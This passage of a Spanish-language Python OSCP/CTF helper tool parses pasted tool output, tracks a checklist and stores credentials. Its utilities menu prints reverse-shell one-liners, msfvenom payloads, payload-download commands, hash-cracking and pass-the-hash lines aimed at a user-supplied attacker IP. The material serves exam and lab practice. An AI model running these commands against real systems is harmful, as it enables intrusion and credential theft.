    entry = {"ts": datetime.now().isoformat(timespec="seconds"), "tools": tools, "text": text[:20000], "vectors": [r[2] for r in matched[:6]]}
    sess.data["history"].append(entry)
    sess.save()
    return {"tools": tools, "facts": f, "matched": matched, "auto": auto}


def trig_match(trig, text, tools):
    t = trig.strip().lower()
    if not t:
        return False
    if t.startswith("@"):
        return t[1:] in [x.lower() for x in tools]
    return t in text.lower()


AUTO_EVIDENCE = {
    ".bash_history", ".git", "/etc/exports", "/etc/passwd", "alwaysinstallelevated", "appdata",
    "consolehost_history", "getnpusers", "getuserspns", "modifiable", "repair\\sam", "suid",
    "sysvol", "seimpersonate", "capabilities", "cron", "id_rsa", "proof.txt", "smb-vuln",
    "smb2-security-mode", "sudo -l", "unattend", "unquoted", "domain:",
}

AUTO_TOOL_IGNORE = {"apache", "php", "openssl", "iis", "nginx", "tomcat", "jenkins", "wordpress", "openssh", "ss", "http.server"}


def evidence_only(text):
    skip = ("└─#", "┌──", "$ ", "# ")
    lines = []
    for line in text.splitlines():
        s = line.strip()
        if not s or any(x in s for x in skip):
            continue
        if re.match(r"^(sudo|nmap|nxc|netexec|crackmapexec|ffuf|gobuster|feroxbuster|nikto|curl|wget|hydra|john|hashcat|ldapsearch|smbclient|smbmap|enum4linux|rpcclient|kerbrute|windapsearch|onesixtyone|snmpwalk|ftp|ssh|mysql|redis-cli|responder|certipy|evil-winrm|chisel|proxychains|searchsploit|msfvenom|python3 -m http\.server)\b", s, re.I):
            continue
        lines.append(s)
    return "\n".join(lines)


def auto_check(text, tools, sess):
    added = []
    evidence = evidence_only(text).lower()
    toolset = [t.lower() for t in tools if t.lower() not in AUTO_TOOL_IGNORE]
    for cid, phase, label, cmd, trig in CHECKLIST_DATA:
        t = trig.strip().lower()
        if t.startswith("@"):
            if t[1:] in toolset:
                added.append(cid)
        elif t in AUTO_EVIDENCE and t in evidence:
            added.append(cid)
    return sess.mark(added)
ASCII_LOGO = [
    "████  █  █  ███ █   █ █████ █████  ████ █████ ███ █   █  ███       █████ ████  ████   ███       ███  ███    ",
    "█░░░█ █░ █░  █░░██ ██░ ░█░░░█░░░░░█ ░░░░ ░█░░░ █░░██  █░█ ░░░       ░░█░░ ░░░█ █░░░█ █ ░░█       █░░█ ░░█   ",
    "████░░█████░ █░░█░█ █░░ █░░░████░░░███░░░ █░░░░█░░█░█ █░█░ ██░████   █░░░░███░░████░░█░ ░█░████  █░░█████░  ",
    "█░░░░ ░░░█░░ █░░█░░░█░░ █░░ █░░░░   ░░█   █░░  █░░█░░██░█░░ █░ ░░░░ █ ░ ░  ░░█ █░░█░ █░░ █░░░░░░ █░░█░░░█░░ ",
    "█░░░░░  ░█░░███░█░░ █░░ █░░ █████░████░░  █░░ ███░█░░ █░░███ ░░ ░░░█████ ████░░█░░░█░ ███ ░░ ░░░███░█░░░█░░ ",
    " ░░       ░░ ░░░ ░░  ░░  ░░  ░░░░░ ░░░░ ░  ░░  ░░░ ░░  ░░ ░░░ ░     ░░░░░ ░░░░ ░░░  ░  ░░░ ░     ░░░ ░░  ░░ ",
    "  ░        ░  ░░░ ░   ░   ░   ░░░░░ ░░░░    ░   ░░░ ░   ░  ░░░       ░░░░░ ░░░░  ░   ░  ░░░       ░░░ ░   ░  ",
]


def banner():
    out("")
    codes = [BGC + WHT, BGB + WHT, BGM + WHT, BGR + WHT, BGY + WHT]
    for i, line in enumerate(ASCII_LOGO):
        out(paint(line, codes[i % len(codes)]))
    out(paint("  P4IMTESTING Z3R0 IA v" + VERSION + "  ·  motor local basado en reglas  ·  sin IA / sin red / sin OSINT automatico", B + CYN))
    out(paint("  Base: 10 metodologias · " + str(len(TOOLS)) + " firmas de herramientas · " + str(len(RULES)) + " reglas de decision · " + str(len(CHECKLIST_DATA)) + " checks", D))
    rule_line("═", D)


def menu(sess):
    d, t = sess.progress()
    out("")
    title("MENU PRINCIPAL", BGB)
    sub(paint("Sesion activa: ", D) + paint(sess.name, YEL + B) + paint("  Objetivo: ", D) + paint(sess.profile.get("target") or "<sin definir>", CYN) + paint("  Progreso: ", D) + bar(d, t, 18))
    opts = [
        ("1", "⚙️  Configurar objetivo / IP Kali / dominio / credenciales"),
        ("2", "🧠 MODO ANALISIS AUTOMATICO  (pegar salidas en bruto)"),
        ("3", "✅ Checklist de la maquina + barra de progreso"),
        ("4", "📚 Biblioteca de las TOP 10 metodologias"),
        ("5", "⌨️  Generador de comandos por puerto / servicio"),
        ("6", "🧹 Utilidades: limpieza, filtros, shells, wordlists"),
        ("7", "🔑 Tabla de credenciales / notas"),
        ("8", "📜 Historial de analisis de esta sesion"),
        ("9", "📄 Exportar reporte Markdown"),
        ("10", "🔄 Cambiar o crear maquina CTF"),
        ("11", "⚖️  Reglas OSCP y recordatorios"),
        ("0", "🚪 Salir"),
    ]
    for k, label in opts:
        code = BGG + WHT if k == "2" else (BGB + WHT if k in ("3", "4") else WHT)
        out(paint("  [" + k.rjust(2) + "] ", code) + label)
    rule_line("─", D)


def ask(label, default=""):
    suffix = paint(" [" + default + "]", D) if default else ""
    try:
        val = input(paint("  " + label + ": ", YEL + B) + suffix + " ").strip()
    except (EOFError, KeyboardInterrupt):
        out("")
        raise SystemExit(0)
    return val or default


def configure(sess):
    title("CONFIGURAR PERFIL DE LA MAQUINA", BGM)
    p = sess.profile
    fields = [
        ("target", "IP o dominio del objetivo CTF"),
        ("kali", "Tu IP Kali (LHOST, normalmente tun0)"),
        ("domain", "Dominio AD (ej: access.offsec)"),
        ("user", "Usuario conocido (opcional)"),
        ("password", "Password conocida (opcional)"),
        ("share", "Compartido SMB interestante (opcional)"),
    ]
    for key, label in fields:
        p[key] = ask(label, p.get(key, ""))
    p["port"] = ask("Puerto web principal", p.get("port") or "80")
    sess.save()
    ok(paint("Perfil guardado para la sesion ", GRN) + paint(sess.name, YEL))
    for k in ("target", "kali", "domain"):
        out(paint("  " + k.upper() + ": ", B) + (p.get(k) or "<vacio>"))


def paste_output():
    out("")
    title("MODO ANALISIS - ENTRADA DE SALIDA CRUDA", BGC)
    out(paint("  Pega aqui la salida de una o varias herramientas juntas.", WHT))
    out(paint("  Termina con una linea que contenga solo ", D) + paint("EOF", B + YEL) + paint("  (o pulsa Ctrl+D).", D))
    out(paint("  Tambien puedes escribir ", D) + paint("@ruta/al/archivo.txt", CYN) + paint(" para leer un fichero.", D))
    rule_line("─", D)
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        except KeyboardInterrupt:
            out("")
            warn("Entrada cancelada.")
            return ""
        if line.strip().upper() in ("EOF", "END", "FIN"):
            break
        lines.append(line)
    text = "\n".join(lines)
    if text.strip().startswith("@") and "\n" not in text.strip():
        path = Path(text.strip()[1:]).expanduser()
        try:
            text = path.read_text(errors="replace")
            ok(paint("Leido archivo: " + str(path), GRN))
        except Exception as e:
            bad("No se pudo leer: " + str(e))
            return ""
    return text


def checklist_view(sess):
    while True:
        d, t = sess.progress()
        out("")
        title("CHECKLIST DE LA MAQUINA: " + sess.name.upper(), BGG)
        out(paint("  Progreso global: ", B) + bar(d, t))
        out("")
        for pid, emoji, _ in [(p[0], p[2], p[1]) for p in PHASES]:
            pd, pt = sess.progress(pid)
            out(paint(f"  {emoji} {pid} ", B) + paint(_[:34].ljust(34), D) + bar(pd, pt, 20))
        out("")
        opts = ["1) Ver todos", "2) Ver una fase", "3) Marcar items", "4) Desmarcar items", "5) Buscar texto", "6) Reiniciar fase", "0) Volver al menu"]
        for o in opts:
            sub(paint(o, CYN if o.startswith("0") else WHT))
        choice = ask("Opcion", "0")
        if choice == "0":
            return
        if choice in ("1", "2", "5", "6"):
            phase = None
            query = ""
            if choice == "2":
                phase = ask("Fase (P0..P11)", "P2").upper()
            elif choice == "5":
                query = ask("Texto a buscar", "smb").lower()
            elif choice == "6":
                phase = ask("Fase a reiniciar (P0..P11)", "P0").upper()
                ids = [c[0] for c in CHECKLIST_DATA if c[1] == phase]
                sess.unmark(ids)
                sess.save()
                warn(f"Reiniciados {len(ids)} items de {phase}")
                continue
            rule_line("─", D)
            for cid, ph, label, cmd, trig in CHECKLIST_DATA:
                if phase and ph != phase:
                    continue
                if query and query not in label.lower() and query not in cmd.lower():
                    continue
                mark = paint("[x]", BGG + WHT) if cid in sess.checked() else paint("[ ]", BGR + WHT)
                out(mark + paint(" " + cid + " ", YEL + B) + paint(label, WHT))
                if cmd:
                    out(paint("       $ ", D) + paint(cmd, D))
            rule_line("─", D)
        elif choice in ("3", "4"):
            raw = ask("IDs separados por coma (o 'all', o una fase como P3)", "")
            if not raw:
                continue
            ids = []
            if raw.lower() == "all":
                ids = [c[0] for c in CHECKLIST_DATA]
            elif re.fullmatch(r"P\d+", raw, re.I):
                ids = [c[0] for c in CHECKLIST_DATA if c[1] == raw.upper()]
            else:
                ids = [x.strip().upper() for x in raw.split(",") if x.strip()]
            valid = {c[0] for c in CHECKLIST_DATA}
            ids = [i for i in ids if i in valid]
            if choice == "3":
                added = sess.mark(ids)
                ok(paint(f"Marcados {len(added)} items", GRN))
            else:
                sess.unmark(ids)
                warn(f"Desmarcados {len(ids)} items")
            sess.save()


def methodologies_view():
    while True:
        out("")
        title("BIBLIOTECA: TOP 10 METODOLOGIAS / CHECKLISTS", BGM)
        for i, (name, desc, steps) in enumerate(METHODOLOGIES, 1):
            out(paint(f"  [{i:2d}] ", BGB + WHT) + paint(name, B) + paint("  ::  " + desc, D))
        sub(paint("0) Volver", CYN))
        c = ask("Metodologia", "0")
        if c == "0":
            return
        try:
            idx = int(c) - 1
            if not 0 <= idx < len(METHODOLOGIES):
                raise ValueError
        except ValueError:
            bad("Opcion no valida")
            continue
        name, desc, steps = METHODOLOGIES[idx]
        out("")
        title(name, BGY)
        sub(paint(desc, D))
        for i, (st, detail, cmds) in enumerate(steps, 1):
            out("")
            out(paint(f"  {i}. {st}", YEL + B))
            sub(paint(detail, WHT))
            for c2 in cmds:
                cmdline(c2)


def quick_commands(sess):
    while True:
        out("")
        title("GENERADOR DE COMANDOS POR PUERTO / SERVICIO", BGC)
        sub(paint("Puertos conocidos: " + ", ".join(sorted(SERVICE_PLAYBOOK, key=int)), D))
        sub(paint("0) Volver  |  escribe un numero de puerto o una palabra (smb, ldap, privesc, bloodhound...)", D))
        c = ask("Puerto o palabra", "0")
        if c == "0":
            return
        found = False
        if c in SERVICE_PLAYBOOK:
            name, cmds = SERVICE_PLAYBOOK[c]
            out("")
            section(f"PUERTO {c} - {name}", BGM)
            values = dict(sess.profile)
            values["ip"] = sess.profile.get("target", "")
            for cmd in cmds:
                cmdline(fill(cmd, values))
            found = True
        else:
            for r in RULES:
                if c.lower() in r[2].lower() or any(c.lower() in x.lower() for x in r[5]):
                    out("")
                    out(paint("  " + r[2], YEL + B))
                    for cmd in r[6]:
                        cmdline(fill(cmd, sess.profile))
                    found = True
        if not found:
            warn("Sin coincidencias. Prueba con otro puerto o palabra.")


def utilities(sess):
    while True:
        out("")
        title("UTILIDADES: LIMPIEZA / FILTROS / SHELLS / WORDLISTS", BGC)
        for i, (label, _) in enumerate(CLEANERS, 1):
            out(paint(f"  [{i:2d}] ", D) + label)
        n = len(CLEANERS)
        extra = [
            ("S", "Generar reverse shells Linux/Windows con tu IP"),
            ("W", "Generar wordlist de usuarios/passwords con mutaciones"),
            ("H", "Identificar tipos de hash y comandos de crack"),
            ("F", "Generar lineas de transferencia de archivos"),
        ]
        for k, label in extra:
            out(paint("  [" + k + "] ", BGB + WHT) + label)
        sub(paint("0) Volver", CYN))
        c = ask("Opcion", "0").upper()
        if c == "0":
            return
        if c.isdigit():
            idx = int(c) - 1
            if 0 <= idx < len(CLEANERS):
                label, cmd = CLEANERS[idx]
                out("")
                section(label, BGM)
                cmdline(cmd)
            else:
                bad("Fuera de rango")
        elif c == "S":
            section("REVERSE SHELLS (LHOST=" + (sess.profile.get("kali") or "<KALI>") + ")", BGM)
            for cmd in [
                "rlwrap nc -lvnp 443",
                "bash -c 'bash -i >& /dev/tcp/{kali}/443 0>&1'",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{kali}\",443));[os.dup2(s.fileno(),i) for i in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST={kali} LPORT=443 -f exe -o shell.exe",
                "msfvenom -p linux/x64/shell_reverse_tcp LHOST={kali} LPORT=443 -f elf -o shell.elf",
            ]:
                cmdline(fill(cmd, sess.profile))
            warn("MSFvenom permitido libremente; Meterpreter solo en una maquina del examen.")
        elif c == "W":
            section("WORDLISTS Y MUTACIONES", BGM)
            for cmd in [
                "for u in admin administrator root guest offsec; do echo $u; echo ${u}@ {domain}; done | sort -u > users.txt",
                "for y in {2020..2026}; do for s in Spring Summer Fall Winter; do echo ${s}${y}; echo ${s}${y}'!'; done; done > passes.txt",
                "grep -iE '^cn:|^sAMAccountName:' ldap.txt | awk '{print $2}' | sort -u > users.txt",
                "hashcat --force -r /usr/share/hashcat/rules/best64.rule wordlist.txt -o mutadas.txt --stdout",
            ]:
                cmdline(fill(cmd, sess.profile))
        elif c == "H":
            section("HASHES", BGM)
            for cmd in [
                "hashid hash.txt",
                "john hash.txt -w=/usr/share/wordlists/rockyou.txt",
                "hashcat -m 1000 NTLM.txt /usr/share/wordlists/rockyou.txt",
                "hashcat -m 13100 SPN.txt /usr/share/wordlists/rockyou.txt",
                "hashcat -m 18200 ASREP.txt /usr/share/wordlists/rockyou.txt",
                "nxc smb {ip} -u {user} -H {hash} --local-auth",
            ]:
                cmdline(fill(cmd, sess.profile))
        elif c == "F":
            section("TRANSFERENCIA DE ARCHIVOS", BGM)
            for cmd in [
                "python3 -m http.server 80 -d ~/Tools &",
                "wget http://{kali}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh",
                "certutil -urlcache -f http://{kali}/winpeas.exe C:\\Windows\\Temp\\winpeas.exe",
                "powershell -c \"iwr http://{kali}/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe\"",
                "impacket-smbserver smb $(pwd) -smb2support",
            ]:
                cmdline(fill(cmd, sess.profile))


def creds_view(sess):
    while True:
        out("")
        title("TABLA DE CREDENCIALES Y NOTAS - " + sess.name, BGM)
        if sess.data["creds"]:
            for i, c in enumerate(sess.data["creds"], 1):
                out(paint(f"  [{i}] ", BGB + WHT) + c)
        else:
            sub(paint("Sin credenciales registradas", D))
        if sess.data.get("notes"):
            sub(paint("Notas: ", B) + sess.data["notes"])
        sub(paint("1) Anadir usuario:pass:origen   2) Borrar indice   3) Editar notas   0) Volver", D))
        c = ask("Opcion", "0")
        if c == "0":
            return
        if c == "1":
            v = ask("usuario:password:origen", "")
            if v:
                sess.data["creds"].append(v)
                sess.save()
                ok("Anadida")
        elif c == "2":
            v = ask("Indice a borrar", "")
            if v.isdigit() and 1 <= int(v) <= len(sess.data["creds"]):
                sess.data["creds"].pop(int(v) - 1)
                sess.save()
                ok("Borrada")
        elif c == "3":
            sess.data["notes"] = ask("Notas", sess.data.get("notes", ""))
            sess.save()
            ok("Guardado")


def history_view(sess):
    hist = sess.data.get("history", [])
    while True:
        out("")
        title("HISTORIAL DE ANALISIS - " + sess.name, BGM)
        if not hist:
            sub(paint("Todavia no hay analisis guardados.", D))
            return
        for i, h in enumerate(hist[-15:], 1):
            sub(paint(f"[{i}] ", YEL) + paint(h.get("ts", ""), D) + "  " + paint(", ".join(h.get("tools", [])) or "sin herramientas", CYN) + "  ::  " + ", ".join(h.get("vectors", [])[:3]))
        sub(paint("0) Volver  |  numero de analisis para ver el texto crudo", D))
        c = ask("Opcion", "0")
        if c == "0":
            return
        if c.isdigit() and 1 <= int(c) <= len(hist[-15:]):
            h = hist[-15:][int(c) - 1]
            rule_line("─", D)
            out(h.get("text", ""))
            rule_line("─", D)
        else:
            bad("Opcion no valida")


def export_report(sess):
    reports = Path.cwd() / "reports"
    reports.mkdir(parents=True, exist_ok=True)
    fname = reports / ("oscp_" + re.sub(r"[^A-Za-z0-9_-]+", "_", sess.name) + "_" + datetime.now().strftime("%Y%m%d_%H%M") + ".md")
    lines = ["# OSCP Advisor - Reporte de sesion", "", "**Maquina:** " + sess.name, "**Generado:** " + datetime.now().isoformat(timespec="seconds"), ""]
    lines.append("## Perfil")
    for k, v in sess.profile.items():
        lines.append("- " + k + ": " + (v or "-"))
    d, t = sess.progress()
    lines += ["", "## Progreso", "", f"{d}/{t} items ({int(100*d/t) if t else 0}%)", ""]
    lines += ["## Checklist", ""]
    for cid, ph, label, cmd, trig in CHECKLIST_DATA:
        lines.append("- [" + ("x" if cid in sess.checked() else " ") + "] " + cid + " " + label)
        if cmd:
            lines.append("  - `" + cmd + "`")
    lines += ["", "## Credenciales", ""]
    for c in sess.data["creds"]:
        lines.append("- " + c)
    lines += ["", "## Notas", "", sess.data.get("notes", ""), "", "## Analisis realizados", ""]
    for h in sess.data.get("history", []):
        lines += ["### " + h.get("ts", ""), "", "Herramientas: " + ", ".join(h.get("tools", [])), "", "Vectores: " + ", ".join(h.get("vectors", [])), "", "```text", h.get("text", "")[:6000], "```", ""]
    fname.write_text("\n".join(lines))
    ok(paint("Reporte exportado: ", GRN) + paint(str(fname), CYN))


def oscp_rules_view():
    out("")
    title("REGLAS Y RECORDATORIOS OSCP (verificar siempre la guia actual)", BGY)
    items = [
        ("Metasploit / Meterpreter", "Solo UNA maquina del examen. msfvenom y multi/handler son libres.", YEL),
        ("Prohibidos", "sqlmap, SQLNinja, escaneadores comerciales (Nessus, Burp Pro scanner), DoS/spoofing.", RED),
        ("Permitidos", "nmap + NSE, ffuf/gobuster/feroxbuster, enum4linux-ng, netexec, linpeas, winpeas, john/hashcat manual.", GRN),
        ("Puntuacion", "70/100 para aprobar. AD 40 pts (10 por workstation, 20 DC). 3 maquinas standalone 20 pts cada una.", CYN),
        ("Tiempo", "23h45. Maximo 2h por maquina antes de rotar. AD primero suele ser mas eficiente.", CYN),
        ("Evidencia", "Screenshot con whoami + hostname + IP + flag. Sin screenshot, la flag no cuenta.", BGR + WHT),
        ("Contrasena con !", "Escapar con \\! en netexec/hydra, aunque uses comillas simples.", YEL),
        ("Ciclo", "Enumerar -> explotar -> re-enumerar con nuevas credenciales -> repetir.", MAG),
    ]
    for k, v, code in items:
        out(paint("  * " + k + ": ", B) + paint(v, code))


def switch_session(sess):
    name = ask("Nombre de la maquina CTF (ej: Access / Target1_AD)", sess.name)
    if not name:
        return sess
    return Session(name)


def parse_args(argv):
    opts = {"session": None, "target": None, "kali": None, "domain": None, "file": None, "check": False, "methods": False}
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--no-color":
            i += 1
        elif a in ("--session", "--target", "--kali", "--domain", "--file") and i + 1 < len(argv):
            key = a[2:]
            opts[key] = argv[i + 1]
            i += 2
        elif a == "--check":
            opts["check"] = True
            i += 1
        elif a == "--methods":
            opts["methods"] = True
            i += 1
        else:
            i += 1
    return opts


def main():
    opts = parse_args(sys.argv[1:])
    sess = Session(opts["session"] or current_session_name())
    changed = False
    for key in ("target", "kali", "domain"):
        if opts[key]:
            sess.profile[key] = opts[key]
            changed = True
    if changed:
        sess.save()
    if opts["check"]:
        d, t = sess.progress()
        out(paint("Sesion: ", B) + sess.name + "  " + bar(d, t))
        for cid, ph, label, cmd, trig in CHECKLIST_DATA:
            mark = paint("[x]", GRN) if cid in sess.checked() else paint("[ ]", RED)
            out(mark + " " + cid + " " + label)
        return
    if opts["methods"]:
        for i, (name, desc, steps) in enumerate(METHODOLOGIES, 1):
            out(paint(str(i).rjust(2) + ". ", YEL) + name + " :: " + desc)
        return
    if opts["file"]:
        try:
            text = Path(opts["file"]).expanduser().read_text(errors="replace")
            analyze_text(text, sess)
        except Exception as e:
            bad("Error leyendo archivo: " + str(e))
        return
    banner()
    while True:
        try:
            menu(sess)
            c = ask("Opcion", "0")
            if c == "0":
                out(paint("  Hasta la proxima. Mantente metodico: enumera, documenta, repite.", CYN))
                break
            elif c == "1":
                configure(sess)
            elif c == "2":
                text = paste_output()
                if text.strip():
                    analyze_text(text, sess)
            elif c == "3":
                checklist_view(sess)
            elif c == "4":
                methodologies_view()
            elif c == "5":
                quick_commands(sess)
            elif c == "6":
                utilities(sess)
            elif c == "7":
                creds_view(sess)
            elif c == "8":
                history_view(sess)
            elif c == "9":
                export_report(sess)
            elif c == "10":
                sess = switch_session(sess)
                sess.save()
                ok(paint("Sesion activa: " + sess.name, GRN))
            elif c == "11":
                oscp_rules_view()
            else:
                warn("Opcion no reconocida")
        except KeyboardInterrupt:
            out("")
            warn("Ctrl+C: volviendo al menu (usa opcion 0 para salir).")


if __name__ == "__main__":
    main()


